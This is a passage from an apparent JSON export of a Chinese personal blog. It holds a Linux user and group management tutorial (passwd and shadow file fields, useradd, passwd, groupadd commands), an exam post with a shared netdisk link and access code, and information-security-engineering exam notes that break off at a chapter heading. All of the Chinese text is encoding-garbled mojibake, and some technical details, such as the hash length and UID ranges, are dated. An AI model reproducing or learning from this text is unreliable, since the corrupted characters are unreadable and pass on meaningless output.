æƒ³è¦æ‰§è¡Œrebooté‡å¯ç³»ç»Ÿå‘½ä»¤è¿™ä¸€æ“ä½œæŒ‰ç†æ¥è¯´æ˜¯ä¸å…è®¸çš„ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆåœ¨æ“ä½œçš„æ—¶å€™åˆå¯ä»¥äº†å‘¢ï¼Œé‚£æ˜¯å› ä¸ºä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤çš„æ—¶å€™æ˜¯ä»¥çš„ç³»ç»Ÿä¼ªç”¨æˆ·ä¸­çš„æŸä¸€ä¸ªçš„èº«ä»½æ‰§è¡Œçš„ 1234567å¸¸è§çš„ç³»ç»Ÿä¼ªç”¨æˆ·å¦‚ä¸‹ï¼šbin æ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶sys æ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶adm æ‹¥æœ‰å¸æˆ·æ–‡ä»¶uucp UUCPä½¿ç”¨lp lpæˆ–lpdå­ç³»ç»Ÿä½¿ç”¨nobody NFSä½¿ç”¨ å¯ä»¥ä½¿ç”¨cat /etc/passwdå‘½ä»¤æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ å¢åˆ æ”¹æŸ¥ç”¨æˆ·123useradd //æ·»åŠ ç”¨æˆ·userdel //åˆ é™¤ç”¨æˆ·usermod //ä¿®æ”¹ç”¨æˆ· å¯ä»¥ä½¿ç”¨man æŸ¥çœ‹ç›¸å…³å‚æ•° ç®¡ç†ç”¨æˆ·å£ä»¤12passwd [option] ç”¨æˆ·å //ä¿®æ”¹å…¶å®ƒç”¨æˆ·å£ä»¤ï¼Œä¸€èˆ¬æ—¶ç”¨rootç”¨æˆ·è¿›è¡Œæ“ä½œpasswd [option] //ä¿®æ”¹é»˜è®¤ç”¨æˆ·åï¼Œä¹Ÿå°±æ˜¯å½“å‰ç”¨æˆ· å¸¸ç”¨option 1234-l(lock) é”å®šå£ä»¤ï¼Œå³ç¦ç”¨è´¦å·ã€‚-u(unlock) å£ä»¤è§£é”ã€‚-d(delete) ä½¿è´¦å·æ— å£ä»¤ã€‚-f(force) å¼ºè¿«ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ä¿®æ”¹å£ä»¤ã€‚ ç”¨æˆ·ç›¸å…³æ–‡ä»¶/etc/passwd é‡Œé¢å­˜æ”¾äº†å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå³ç”¨æˆ·çš„å±æ€§ 123456789ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shellä¾‹å­ï¼špysnow:x:1314:1111::/home/example:/usr/bin/bashç”¨æˆ·åï¼špysnowå£ä»¤ï¼šxç”¨æˆ·æ ‡è¯†å·ï¼š1314ç»„æ ‡è¯†å·ï¼š1111commentæè¿°ï¼šæ— å®¶ç›®å½•ï¼š/home/exampleç™»é™†bash: /usr/bin/bash /etc/shadow ç”¨æ¥å­˜æ”¾ç”¨æˆ·å£ä»¤åŠ å¯†åçš„ä¿¡æ¯ï¼Œä¸€èˆ¬æ™®é€šç”¨æˆ·æ˜¯æ— æƒè®¿é—®çš„ 12345678910111213141516171819ç™»å½•å:åŠ å¯†å£ä»¤:æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´:æœ€å°æ—¶é—´é—´éš”:æœ€å¤§æ—¶é—´é—´éš”:è­¦å‘Šæ—¶é—´:ä¸æ´»åŠ¨æ—¶é—´:å¤±æ•ˆæ—¶é—´:æ ‡å¿—ä¾‹å­ï¼špysnow:!:18973:0:99999:7:::ç™»å½•åï¼š&quot;ç™»å½•å&quot;æ˜¯ä¸/etc/passwdæ–‡ä»¶ä¸­çš„ç™»å½•åç›¸ä¸€è‡´çš„ç”¨æˆ·è´¦å·åŠ å¯†å£ä»¤ï¼šå£ä»¤å­—æ®µå­˜æ”¾çš„æ˜¯åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ï¼Œé•¿åº¦ä¸º13ä¸ªå­—ç¬¦ã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™å¯¹åº”ç”¨æˆ·æ²¡æœ‰å£ä»¤ï¼Œç™»å½•æ—¶ä¸éœ€è¦å£ä»¤ï¼›å¦‚æœå«æœ‰ä¸å±äºé›†åˆ &#123; ./0-9A-Za-z &#125;ä¸­çš„å­—ç¬¦ï¼Œåˆ™å¯¹åº”çš„ç”¨æˆ·ä¸èƒ½ç™»å½•ã€‚æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šè¡¨ç¤ºçš„æ˜¯ä»æŸä¸ªæ—¶åˆ»èµ·ï¼Œåˆ°ç”¨æˆ·æœ€åä¸€æ¬¡ä¿®æ”¹å£ä»¤æ—¶çš„å¤©æ•°ã€‚æ—¶é—´èµ·ç‚¹å¯¹ä¸åŒçš„ç³»ç»Ÿå¯èƒ½ä¸ä¸€æ ·æœ€å°æ—¶é—´é—´éš”ï¼šæŒ‡çš„æ˜¯ä¸¤æ¬¡ä¿®æ”¹å£ä»¤ä¹‹é—´æ‰€éœ€çš„æœ€å°å¤©æ•°ã€‚æœ€å¤§æ—¶é—´é—´éš”ï¼šæŒ‡çš„æ˜¯å£ä»¤ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚è­¦å‘Šæ—¶é—´ï¼šå­—æ®µè¡¨ç¤ºçš„æ˜¯ä»ç³»ç»Ÿå¼€å§‹è­¦å‘Šç”¨æˆ·åˆ°ç”¨æˆ·å¯†ç æ­£å¼å¤±æ•ˆä¹‹é—´çš„å¤©æ•°ã€‚ä¸æ´»åŠ¨æ—¶é—´ï¼šè¡¨ç¤ºçš„æ˜¯ç”¨æˆ·æ²¡æœ‰ç™»å½•æ´»åŠ¨ä½†è´¦å·ä»èƒ½ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚å¤±æ•ˆæ—¶é—´ï¼šå­—æ®µç»™å‡ºçš„æ˜¯ä¸€ä¸ªç»å¯¹çš„å¤©æ•°ï¼Œå¦‚æœä½¿ç”¨äº†è¿™ä¸ªå­—æ®µï¼Œé‚£ä¹ˆå°±ç»™å‡ºç›¸åº”è´¦å·çš„ç”Ÿå­˜æœŸã€‚æœŸæ»¡åï¼Œè¯¥è´¦å·å°±ä¸å†æ˜¯ä¸€ä¸ªåˆæ³•çš„è´¦å·ï¼Œä¹Ÿå°±ä¸èƒ½å†ç”¨æ¥ç™»å½•äº†ã€‚ /etc/skel è¿™æ˜¯ä¸€ä¸ªé…ç½®æ–‡ä»¶å¤¹ï¼Œç”¨äºé…ç½®åˆ›å»ºç”¨æˆ·æ—¶çš„é‚£äº›é»˜è®¤å±æ€§ ç”¨æˆ·å±æ€§123456789101112131415161718192021222324252627ç”¨æˆ·åï¼šæ˜¯ä»£è¡¨ç”¨æˆ·è´¦å·çš„å­—ç¬¦ä¸²ã€‚é€šå¸¸é•¿åº¦ä¸è¶…è¿‡8ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ç”±å¤§å°å†™å­—æ¯å’Œ/æˆ–æ•°å­—ç»„æˆã€‚ç™»å½•åä¸­ä¸èƒ½æœ‰å†’å·(:)ï¼Œå› ä¸ºå†’å·åœ¨è¿™é‡Œæ˜¯åˆ†éš”ç¬¦ã€‚ä¸ºäº†å…¼å®¹èµ·è§ï¼Œç™»å½•åä¸­æœ€å¥½ä¸è¦åŒ…å«ç‚¹å­—ç¬¦(.)ï¼Œå¹¶ä¸”ä¸ä½¿ç”¨è¿å­—ç¬¦(-)å’ŒåŠ å·(+)æ‰“å¤´ã€‚å£ä»¤ï¼šå³ç”¨æˆ·åçš„ç™»å½•å¯†ç ï¼Œä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†æ˜¯ç”±äº/etc/passwdæ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinux ç³»ç»Ÿï¼ˆå¦‚SVR4ï¼‰éƒ½ä½¿ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£çš„åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—å­˜æ”¾åˆ°/etc/shadowæ–‡ä»¶ä¸­ï¼Œè€Œåœ¨/etc/passwdæ–‡ä»¶çš„å£ä»¤å­—æ®µä¸­åªå­˜æ”¾ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚â€œxâ€æˆ–è€…â€œ*â€ç”¨æˆ·æ ‡è¯†ç¬¦(uid):æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç³»ç»Ÿå†…éƒ¨ç”¨å®ƒæ¥æ ‡è¯†ç”¨æˆ·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å®ƒä¸ç”¨æˆ·åæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å¦‚æœå‡ ä¸ªç”¨æˆ·åå¯¹åº”çš„ç”¨æˆ·æ ‡è¯†å·æ˜¯ä¸€æ ·çš„ï¼Œç³»ç»Ÿå†…éƒ¨å°†æŠŠå®ƒä»¬è§†ä¸ºåŒä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥æœ‰ä¸åŒçš„å£ä»¤ã€ä¸åŒçš„ä¸»ç›®å½•ä»¥åŠä¸åŒçš„ç™»å½•Shellç­‰ã€‚é€šå¸¸ç”¨æˆ·æ ‡è¯†å·çš„å–å€¼èŒƒå›´æ˜¯0ï½65 535ã€‚0æ˜¯è¶…çº§ç”¨æˆ·rootçš„æ ‡è¯†å·ï¼Œ1ï½99ç”±ç³»ç»Ÿä¿ç•™ï¼Œä½œä¸ºç®¡ç†è´¦å·ï¼Œæ™®é€šç”¨æˆ·çš„æ ‡è¯†å·ä»100å¼€å§‹ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªç•Œé™æ˜¯500ã€‚ç»„æ ‡è¯†ç¬¦ï¼šç±»æ¯”äºç”¨æˆ·æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºç”¨æˆ·æ‰€å±çš„ç»„ï¼Œä¸”/etc/passwdæ˜¯ä¸/etc/groupå¯¹åº”çš„comment(æ³¨é‡Šæ€§æè¿°):ç±»ä¼¼äºç¼–ç¨‹é‡Œé¢çš„æ³¨é‡Šï¼Œç¼–è¯‘è¿è¡Œçš„æ—¶å€™ä¸ä¼šè¿è¡Œï¼Œä½†å¯ä»¥èµ·åˆ°å¸®åŠ©åˆ«äººå¿«é€Ÿçœ‹æ‡‚ä»£ç ï¼Œå­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µã€‚ä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ï¼Œè¿™ä¸ªå­—æ®µå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„ç”¨é€”ã€‚åœ¨ä¸åŒçš„Linux ç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µçš„æ ¼å¼å¹¶æ²¡æœ‰ç»Ÿä¸€ã€‚åœ¨è®¸å¤šLinuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µå­˜æ”¾çš„æ˜¯ä¸€æ®µä»»æ„çš„æ³¨é‡Šæ€§æè¿°æ–‡å­—ï¼Œç”¨åšfingerå‘½ä»¤çš„è¾“å‡ºã€‚ä¸»ç›®å½•ï¼šä¹Ÿå°±æ˜¯ç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½•ã€‚å®ƒæ˜¯ç”¨æˆ·åœ¨ç™»å½•åˆ°ç³»ç»Ÿä¹‹åæ‰€å¤„çš„ç›®å½•ã€‚åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œå„ç”¨æˆ·çš„ä¸»ç›®å½•éƒ½è¢«ç»„ç»‡åœ¨åŒä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸‹ï¼Œè€Œç”¨æˆ·ä¸»ç›®å½•çš„åç§°å°±æ˜¯è¯¥ç”¨æˆ·çš„ç™»å½•åã€‚å„ç”¨æˆ·å¯¹è‡ªå·±çš„ä¸»ç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œï¼ˆæœç´¢ï¼‰æƒé™ï¼Œå…¶ä»–ç”¨æˆ·å¯¹æ­¤ç›®å½•çš„è®¿é—®æƒé™åˆ™æ ¹æ®å…·ä½“æƒ…å†µè®¾ç½®ã€‚ç™»é™†shellï¼šç”¨æˆ·ç™»å½•åï¼Œè¦å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œè´Ÿè´£å°†ç”¨æˆ·çš„æ“ä½œä¼ ç»™å†…æ ¸ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ç”¨æˆ·ç™»å½•åˆ°ç³»ç»Ÿåè¿è¡Œçš„å‘½ä»¤è§£é‡Šå™¨æˆ–æŸä¸ªç‰¹å®šçš„ç¨‹åºï¼Œå³Shellã€‚Shellæ˜¯ç”¨æˆ·ä¸Linuxç³»ç»Ÿä¹‹é—´çš„æ¥å£ã€‚Linuxçš„Shellæœ‰è®¸å¤šç§ï¼Œæ¯ç§éƒ½æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚å¸¸ç”¨çš„æœ‰sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX/TOPS-20 type C Shell), bash(Bourne Again Shell)ç­‰ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ ¹æ®ç³»ç»Ÿæƒ…å†µå’Œç”¨æˆ·ä¹ æƒ¯ä¸ºç”¨æˆ·æŒ‡å®šæŸä¸ªShellã€‚å¦‚æœä¸æŒ‡å®šShellï¼Œé‚£ä¹ˆç³»ç»Ÿä½¿ç”¨shä¸ºé»˜è®¤çš„ç™»å½•Shellï¼Œå³è¿™ä¸ªå­—æ®µçš„å€¼ä¸º/bin/shã€‚ç”¨æˆ·çš„ç™»å½•Shellä¹Ÿå¯ä»¥æŒ‡å®šä¸ºæŸä¸ªç‰¹å®šçš„ç¨‹åºï¼ˆæ­¤ç¨‹åºä¸æ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼‰ã€‚åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é™åˆ¶ç”¨æˆ·åªèƒ½è¿è¡ŒæŒ‡å®šçš„åº”ç”¨ç¨‹åºï¼Œåœ¨è¯¥åº”ç”¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œç”¨æˆ·å°±è‡ªåŠ¨é€€å‡ºäº†ç³»ç»Ÿã€‚æœ‰äº›Linux ç³»ç»Ÿè¦æ±‚åªæœ‰é‚£äº›åœ¨ç³»ç»Ÿä¸­ç™»è®°äº†çš„ç¨‹åºæ‰èƒ½å‡ºç°åœ¨è¿™ä¸ªå­—æ®µä¸­ã€‚*ä¼ªç”¨æˆ·ï¼šè¿™äº›ç”¨æˆ·åœ¨/etc/passwdæ–‡ä»¶ä¸­ä¹Ÿå æœ‰ä¸€æ¡è®°å½•ï¼Œä½†æ˜¯ä¸èƒ½ç™»å½•ï¼Œå› ä¸ºå®ƒä»¬çš„ç™»å½•Shellä¸ºç©ºã€‚å®ƒä»¬çš„å­˜åœ¨ä¸»è¦æ˜¯æ–¹ä¾¿ç³»ç»Ÿç®¡ç†ï¼Œæ»¡è¶³ç›¸åº”çš„ç³»ç»Ÿè¿›ç¨‹å¯¹æ–‡ä»¶å±ä¸»çš„è¦æ±‚ã€‚ ç”¨æˆ·ç»„ç®¡ç†ç”¨æˆ·ç»„çš„æ‰€æœ‰ä¿¡æ¯éƒ½å­˜æ”¾åœ¨ /etc/group 123456789ç»„å:å£ä»¤:ç»„æ ‡è¯†å·:ç»„å†…ç”¨æˆ·åˆ—è¡¨ç»„åï¼šæ˜¯ç”¨æˆ·ç»„çš„åç§°ï¼Œç”±å­—æ¯æˆ–æ•°å­—æ„æˆã€‚ä¸/etc/passwdä¸­çš„ç™»å½•åä¸€æ ·ï¼Œç»„åä¸åº”é‡å¤ã€‚å£ä»¤ï¼šå­—æ®µå­˜æ”¾çš„æ˜¯ç”¨æˆ·ç»„åŠ å¯†åçš„å£ä»¤å­—ã€‚ä¸€èˆ¬Linux ç³»ç»Ÿçš„ç”¨æˆ·ç»„éƒ½æ²¡æœ‰å£ä»¤ï¼Œå³è¿™ä¸ªå­—æ®µä¸€èˆ¬ä¸ºç©ºï¼Œæˆ–è€…æ˜¯*ã€‚ç»„æ ‡è¯†å·ï¼šä¸ç”¨æˆ·æ ‡è¯†å·ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¢«ç³»ç»Ÿå†…éƒ¨ç”¨æ¥æ ‡è¯†ç»„ã€‚ç»„å†…ç”¨æˆ·åˆ—è¡¨ï¼šæ˜¯å±äºè¿™ä¸ªç»„çš„æ‰€æœ‰ç”¨æˆ·çš„åˆ—è¡¨ï¼Œä¸åŒç”¨æˆ·ä¹‹é—´ç”¨é€—å·(,)åˆ†éš”ã€‚è¿™ä¸ªç”¨æˆ·ç»„å¯èƒ½æ˜¯ç”¨æˆ·çš„ä¸»ç»„ï¼Œä¹Ÿå¯èƒ½æ˜¯é™„åŠ ç»„ã€‚ 12groupadd [option] ç”¨æˆ·ç»„ //å¢åŠ groupdel ç”¨æˆ·ç»„ //åˆ é™¤ å¸¸ç”¨optioné€‰é¡¹ï¼š 12-g GID æŒ‡å®šæ–°ç”¨æˆ·ç»„çš„ç»„æ ‡è¯†å·ï¼ˆGIDï¼‰ã€‚-o ä¸€èˆ¬ä¸-gé€‰é¡¹åŒæ—¶ä½¿ç”¨ï¼Œè¡¨ç¤ºæ–°ç”¨æˆ·ç»„çš„GIDå¯ä»¥ä¸ç³»ç»Ÿå·²æœ‰ç”¨æˆ·ç»„çš„GIDç›¸åŒã€‚ 1groupmod [option] ç”¨æˆ·ç»„ //æ›´æ”¹ å¸¸ç”¨optioné€‰é¡¹ï¼š 123-g GID ä¸ºç”¨æˆ·ç»„æŒ‡å®šæ–°çš„ç»„æ ‡è¯†å·ã€‚-o ä¸-gé€‰é¡¹åŒæ—¶ä½¿ç”¨ï¼Œç”¨æˆ·ç»„çš„æ–°GIDå¯ä»¥ä¸ç³»ç»Ÿå·²æœ‰ç”¨æˆ·ç»„çš„GIDç›¸åŒã€‚-næ–°ç”¨æˆ·ç»„ å°†ç”¨æˆ·ç»„çš„åå­—æ”¹ä¸ºæ–°åå­— ç”¨æˆ·å¯ä»¥é€šè¿‡newgrpåˆ‡æ¢æˆå…¶å®ƒç”¨æˆ·ç»„ï¼Œå½“ç„¶å‰ææ˜¯é‚£ä¸ªç”¨æˆ·ç»„æ˜¯ä½ è¿™ä¸ªç”¨æˆ·çš„é™„åŠ ç»„ 1newgrp root //åˆ‡æ¢åˆ°rootç»„","categories":[{"name":"Linux","slug":"Linux","permalink":"https://gryffinbit.top/categories/Linux/"}],"tags":[{"name":"Linux/MacOs","slug":"Linux-MacOs","permalink":"https://gryffinbit.top/tags/Linux-MacOs/"}],"author":"Gryffinbit"},{"title":"ä¸“ä¸šè‹±è¯­","slug":"ä¸“ä¸šè‹±è¯­","date":"2021-07-08T10:53:47.000Z","updated":"2024-11-12T06:59:52.000Z","comments":true,"path":"2021/07/08/ä¸“ä¸šè‹±è¯­/","permalink":"https://gryffinbit.top/2021/07/08/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/","excerpt":"","text":"è€ƒæ ¸å†…å®¹ é™„ä»¶é“¾æ¥: https://pan.baidu.com/s/14ErQdA18zEQggeYIp2KwUg å¯†ç : 9damâ€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº« é™„ä»¶åŒ…å«ï¼š è€ƒæ ¸å†…å®¹ RSA-latexçš„ä¸€æ¬¡ä½œä¸š Latexå­¦æœ¯æ¨¡æ¿","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"ä¸“ä¸šè‹±è¯­","slug":"æœŸæœ«è€ƒè¯•/ä¸“ä¸šè‹±è¯­","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"ä¿¡æ¯å®‰å…¨å·¥ç¨‹","slug":"ä¿¡æ¯å®‰å…¨å·¥ç¨‹","date":"2021-07-08T10:39:37.000Z","updated":"2024-11-12T06:59:58.000Z","comments":true,"path":"2021/07/08/ä¿¡æ¯å®‰å…¨å·¥ç¨‹/","permalink":"https://gryffinbit.top/2021/07/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B/","excerpt":"","text":"ã€ä¿¡æ¯å®‰å…¨å·¥ç¨‹ã€‘æœŸæœ«è€ƒè¯•é™„ä»¶ä¿¡æ¯å®‰å…¨å·¥ç¨‹çš„å®éªŒæŠ¥å‘Š é“¾æ¥: https://pan.baidu.com/s/1fFeykV8HBbEEBw-fV4YFAQ æå–ç : 16u7 å¤åˆ¶è¿™æ®µå†…å®¹åæ‰“å¼€ç™¾åº¦ç½‘ç›˜æ‰‹æœºAppï¼Œæ“ä½œæ›´æ–¹ä¾¿å“¦ é¢˜å‹1ã€å•é€‰é¢˜ï¼š20é¢˜20åˆ†2ã€å¡«ç©ºé¢˜ï¼š10é¢˜10åˆ†3ã€åˆ¤æ–­é¢˜ï¼š10é¢˜10åˆ†4ã€ç®€å•é¢˜ï¼š3é¢˜30åˆ†5ã€ç»¼åˆé¢˜ï¼š2é¢˜30åˆ† ç¬¬ä¸€ç« ï¼šä¿¡æ¯å®‰å…¨å·¥ç¨‹åŸºç¡€ä¿¡æ¯å®šä¹‰ ä¿¡æ¯æ˜¯èƒ½å¤Ÿç”¨æ¥æ¶ˆé™¤éšæœºä¸ç¡®å®šæ€§çš„ä¸œâ»„â€”é¦™å†œ ç†è§£ ä¿¡æ¯æ˜¯å¯¹å®¢è§‚ä¸–ç•Œä¸­å„ç§äº‹ç‰©çš„è¿åŠ¨çŠ¶æ€å’Œå˜åŒ–çš„åæ˜ ï¼Œæ˜¯å®¢è§‚äº‹ç‰©ä¹‹é—´ç›¸äº’è”ç³»å’Œç›¸äº’ä½œç”¨çš„è¡¨å¾ï¼Œè¡¨ç°çš„æ˜¯å®¢è§‚äº‹ç‰©è¿åŠ¨çŠ¶æ€å’Œå˜åŒ–çš„å®è´¨å†…å®¹ã€‚ ä»·å€¼ å½“ä»Šäººä»¬æ­£å¤„åœ¨ä¸€ä¸ªâ€œä¿¡æ¯æ—¶ä»£â€ï¼Œä¿¡æ¯å¦‚æ°´ï¼ŒçŸ³æ²¹ä¸€æ ·ï¼Œæˆä¸ºæˆ‘ä»¬ç»´æŒæ­£å¸¸ç”Ÿæ´»å¿…ä¸å¯å°‘çš„èµ„ æºï¼Œäººç±»ç¦»ä¸å¼€ä¿¡æ¯ã€‚ ä¿¡æ¯å®‰å…¨å®šä¹‰ ç½‘ç»œç©ºé—´å®‰å…¨çš„æ ¸å¿ƒå†…æ¶µæ˜¯ä¿¡æ¯å®‰å…¨ã€‚ æˆå›  å†…å› ï¼š ä¿¡æ¯æŠ€æœ¯ä¸äº§ä¸šçš„ç©ºå‰ç¹è£ï¼Œä½¿æˆ‘ä»¬éœ€è¦é‡è§†ä¿¡æ¯çš„å®‰å…¨ã€‚ ä¿¡æ¯ç³»ç»Ÿçš„å¤æ‚æ€§ï¼Œæ˜“å¯¼è‡´é”™è¯¯ã€‚ ç»“æ„å¤æ‚ï¼Œå®¹æ˜“è®©ä¸æ³•åˆ†å­æœ‰æœºå¯ä¹˜ã€‚ å¤–å› ï¼šäººä¸ºå¨èƒä¸è‡ªç„¶å¨èƒ ä¿¡æ¯ç³»ç»Ÿ æ„æˆï¼šè½¯ä»¶ã€ç¡¬ä»¶ã€æ•°æ®ã€äººã€æ“ä½œ åŠŸèƒ½ï¼šè¾“å…¥ã€å‚¨å­˜ã€å¤„ç†ã€è¾“å‡ºã€æ§åˆ¶ ç›®æ ‡ æ€»ä½“ç›®æ ‡ï¼šä¿æŠ¤ä¿¡æ¯ä¸å—åˆ°æŸå®³ã€‚ç¡®ä¿ä¸šåŠ¡è¿ç»­æ€§ã€ç¼é£é™©æœ€å°åŒ–ã€‚æŠ•èµ„å’Œå›æŠ¥æœ€å¤§åŒ–ã€‚ åŸºæœ¬ç›®æ ‡ï¼š ä¸‰å¤§å±æ€§å®‰å…¨ï¼šCIA æœºå¯†æ€§ã€å®Œæ•´æ€§ã€å¯ç”¨æ€§ å¤šå±‚è¦ç´ å®‰å…¨ï¼š è®¾å¤‡å®‰å…¨ã€æ•°æ®å®‰å…¨ã€è¡Œä¸ºå®‰å…¨ã€å†…å®¹å®‰å…¨ å‘å±•å² ç½‘ç»œç©ºé—´å®‰å…¨ï¼šäººã€ç‰©è´¨ä¸–ç•Œã€ä¿¡æ¯ç©ºé—´ é€šä¿¡ â†’ è®¡ç®—æœº â†’ ä¿¡æ¯ç³»ç»Ÿ â†’ ä¿¡æ¯å®‰å…¨ä¿éšœ â†’ CS&#x2F;IA ä¿¡æ¯å®‰å…¨ä¿éšœå®šä¹‰ å¯¹ä¿¡æ¯ç³»ç»Ÿé£é™©åˆ†æï¼Œåˆ¶å®šå®‰å…¨ç­–ç•¥ï¼Œä¿éšœä¿¡æ¯ç³»ç»ŸCIAï¼Œé™ä½é£é™© ç†è§£ã€ä»·å€¼ ä¿¡æ¯ç³»ç»Ÿå®‰å…¨ä¿éšœæ¨¡å‹çš„3ä¸ªæ–¹é¢:ä¿éšœè¦ç´ ã€ç”Ÿå‘½å‘¨æœŸã€å®‰å…¨ç‰¹å¾ã€‚ ç”Ÿå‘½å‘¨æœŸ è®¡åˆ’ç»„ç»‡é˜¶æ®µâ†’å¼€å‘é‡‡è´­é˜¶æ®µâ†’å®æ–½äº¤ä»˜é˜¶æ®µâ†’è¿è¡Œç»´æŠ¤é˜¶æ®µâ†’åºŸå¼ƒé˜¶æ®µ ï¼ˆå˜æ›´å’Œåé¦ˆï¼‰ ä¿éšœè¦ç´  æŠ€æœ¯ã€ç®¡ç†ã€å·¥ç¨‹ã€äººå‘˜ ç›®æ ‡ ä¿¡æ¯ç³»ç»Ÿ(åŒ…æ‹¬ç¡¬ä»¶ã€è½¯ä»¶ã€æ•°æ®ã€äººã€ç‰©ç†ç¯å¢ƒåŠå…¶åŸºç¡€è®¾æ–½)å—åˆ°ä¿æŠ¤ï¼Œä¸å—å¶ç„¶çš„æˆ–è€…æ¶æ„çš„åŸå› è€Œé­åˆ°ç ´åã€æ›´æ”¹ã€æ³„éœ²ï¼Œç³»ç»Ÿè¿ç»­å¯é æ­£å¸¸åœ°è¿è¡Œï¼Œä¿¡æ¯æœåŠ¡ä¸ä¸­æ–­ï¼Œæœ€ç»ˆå®ç°ä¸šåŠ¡è¿ç»­æ€§ã€‚ ä¿¡æ¯å®‰å…¨ä¿éšœæŠ€æœ¯æ¡†æ¶ï¼ˆIATFï¼‰ çºµæ·±é˜²å¾¡ æŠ€æœ¯æ¡†æ¶ç„¦ç‚¹åŸŸ è®¡ç®—ç¯å¢ƒã€åŒºåŸŸè¾¹ç•Œã€ç½‘ç»œåŸºç¡€è®¾æ–½ã€æ”¯æŒæ€§åŸºç¡€è®¾æ–½ ä¿¡æ¯å®‰å…¨å·¥ç¨‹å®šä¹‰ ä¿¡æ¯å®‰å…¨å·¥ç¨‹æ˜¯é‡‡ç”¨å·¥ç¨‹çš„æ¦‚å¿µã€åŸç†ã€æŠ€æœ¯å’Œæ–¹æ³•ï¼Œæ¥ç ”ç©¶ã€å¼€å‘ã€å®æ–½ä¸ç»´æŠ¤ä¿¡æ¯ç³»ç»Ÿå®‰å…¨çš„è¿‡ç¨‹ï¼Œå®ƒå°†ç»è¿‡æ—¶é—´è¯æ˜æ˜¯æ­£ç¡®çš„å·¥ç¨‹å®è·µæµç¨‹ã€ç®¡ç†æŠ€æœ¯å’Œå½“å‰èƒ½å¤Ÿå¾—åˆ°çš„æœ€å¥½çš„æŠ€æœ¯æ–¹æ³•ç›¸ç»“åˆï¼Œæ¥è§£å†³ä¿¡æ¯å®‰å…¨ä¿éšœé—®é¢˜ã€‚ ç¬¬äºŒç« 